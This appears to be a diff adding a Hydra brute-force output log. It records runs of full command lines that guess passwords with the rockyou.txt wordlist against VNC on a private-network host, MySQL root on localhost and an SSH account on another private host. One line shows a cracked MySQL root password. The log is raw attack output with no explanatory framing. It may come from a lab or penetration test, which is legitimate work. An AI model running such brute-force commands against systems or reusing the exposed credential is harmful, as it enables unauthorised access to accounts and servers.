@@ -1,0 +1,5 @@
+# Hydra v9.5 run at 2024-01-05 10:10:46 on 192.168.1.38 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.38:5900)
+# Hydra v9.5 run at 2024-01-05 10:13:21 on 192.168.1.38 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.38:5900)
+# Hydra v9.5 run at 2024-01-06 11:24:38 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
+[3306][mysql] host: localhost   login: root   password: Cmonster2006
+# Hydra v9.5 run at 2024-01-06 11:36:28 on 192.168.1.99 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.99:22)
